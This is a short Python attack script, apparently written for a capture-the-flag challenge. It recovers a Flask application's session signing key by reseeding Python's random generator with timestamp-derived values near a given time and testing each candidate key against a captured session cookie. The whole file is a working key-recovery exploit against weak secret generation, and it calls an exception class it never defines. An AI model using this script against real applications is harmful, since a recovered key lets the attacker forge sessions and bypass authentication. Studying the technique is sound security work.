import hashlib
from functools import lru_cache
from itsdangerous import base64_decode, URLSafeTimedSerializer, BadSignature, TimestampSigner
from flask.json.tag import TaggedJSONSerializer
import random

def verify(value: str, secret: str, legacy: bool=False, salt: str="cookie-session") -> bool:
    """
    Verifies if a given value matches the signed signature
    :param value: Session cookie string to verify
    :param secret: Secret key
    :param salt: Salt (default: 'cookie-session')
    :param legacy: Should the legacy timestamp generator be used?
    :return: True if the secret key is valid
    """
    if not isinstance(secret, (bytes, str)):
        raise FlaskUnsignException(
            f"Secret must be a string-type (bytes, str) and received "
            f"{type(secret).__name__!r}. To fix this, either add quotes to the "
            f"secret {secret!r} or use the --no-literal-eval argument.")

    try:
        get_serializer(secret, legacy, salt).loads(value)
    except BadSignature:
        return False
    
    return True


@lru_cache()
def get_serializer(secret: str, legacy: bool, salt: str) -> URLSafeTimedSerializer:
    """
    Get a (cached) serializer instance
    :param secret: Secret key
    :param salt: Salt
    :param legacy: Should the legacy timestamp generator be used?
    :return: Flask session serializer
    """
    signer = TimestampSigner

    return URLSafeTimedSerializer(
        secret_key=secret,
        salt=salt,
        serializer=TaggedJSONSerializer(),
        signer=signer,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1})


timestamp = int(input("Enter the timestamp: "))
session_cookie = input("Enter the session cookie: ")

adjusted_timestamp = int((timestamp - (timestamp % 10_000_000))/10_000_000)

for i in range(-100,100):
    test_timestamp = adjusted_timestamp + i
    test_seed = test_timestamp * 10_000_000
    random.seed(test_seed)
    secret_key = str(random.getrandbits(256))

    if verify(session_cookie, secret_key):
        print(f"Found secret key: {secret_key}")
        break